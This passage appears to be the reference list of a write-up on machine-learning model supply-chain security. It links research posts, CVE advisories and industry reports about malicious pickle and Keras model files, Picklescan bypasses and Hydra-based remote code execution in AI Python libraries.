- [CyberBlog: TensorFlow RCE with Malicious Model](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)
- [DEV: Understanding SafeTensors](https://dev.to/lukehinds/understanding-safetensors-a-secure-alternative-to-pickle-for-ml-models-o71)
- [HuggingFace: Pickle Scanning Documentation](https://huggingface.co/docs/hub/en/security-pickle)
- [Huntr: Exposing Keras Lambda Exploits](https://blog.huntr.com/exposing-keras-lambda-exploits-in-tensorflow-models)

### Vulnerability Databases
- [CVE-2024-3660: Keras Lambda Layer Code Injection](https://www.kb.cert.org/vuls/id/253266)
- [CVE-2025-1716: Picklescan RCE Bypass](https://github.com/advisories/GHSA-655q-fx9r-782v)
- [CVE-2025-10155/10156/10157: Picklescan Zero-Days](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/)
- [CVE-2025-23304: NVIDIA NeMo Hydra RCE](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [CVE-2026-22584: Salesforce Uni2TS Hydra RCE](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)

### Industry Analysis
- [The Hacker News: 100+ Malicious AI/ML Models on HuggingFace](https://thehackernews.com/2024/03/over-100-malicious-aiml-models-found-on.html)
- [The Hacker News: Malicious ML Models Leverage Broken Pickle](https://thehackernews.com/2025/02/malicious-ml-models-found-on-hugging.html)
- [Trend Micro: Exploiting Trust in Open-Source AI](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/exploiting-trust-in-open-source-ai-the-hidden-supply-chain-risk-no-one-is-watching)
- [Wiz: Malicious AI Models Risks](https://www.wiz.io/academy/ai-security/malicious-ai-models)
- [Nightfall: Model Integrity Verification Guide](https://www.nightfall.ai/ai-security-101/model-integrity-verification)
- [Rapid7: From .pth to p0wned](https://www.rapid7.com/blog/post/from-pth-to-p0wned-abuse-of-pickle-files-in-ai-model-supply-chains/)
